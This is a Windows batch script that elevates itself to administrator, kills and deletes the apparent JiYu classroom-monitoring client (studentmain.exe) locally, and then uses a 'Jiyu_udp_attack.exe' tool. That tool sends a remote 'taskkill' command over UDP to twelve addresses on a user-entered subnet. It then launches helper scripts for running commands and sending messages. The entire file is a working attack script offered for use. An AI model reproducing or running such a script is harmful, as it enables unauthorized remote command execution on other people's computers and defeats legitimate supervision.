@echo off
fltmc >nul 2>&1 || (powershell start -verb runas '%0' & exit)
cd /d "%~dp0"


taskkill /f /im studentmain.exe
rmdir /s /q "%APPDATA%\ETS"
cd /d "%~dp0"

start 端口查看.bat
set /p IP=IP(不包含最后的两三个数字,包含"."）:
set /p P=端口:



Jiyu_udp_attack.exe -ip %IP%17 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%96 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%69 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%79 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%34 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%38 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%48 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%59 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%24 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%91 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%102 -p %P% -c "taskkill /f /im studentmain.exe"
Jiyu_udp_attack.exe -ip %IP%52 -p %P% -c "taskkill /f /im studentmain.exe"

start EtsContentViewer.exe
start 执行命令.bat
start 发送信息.bat

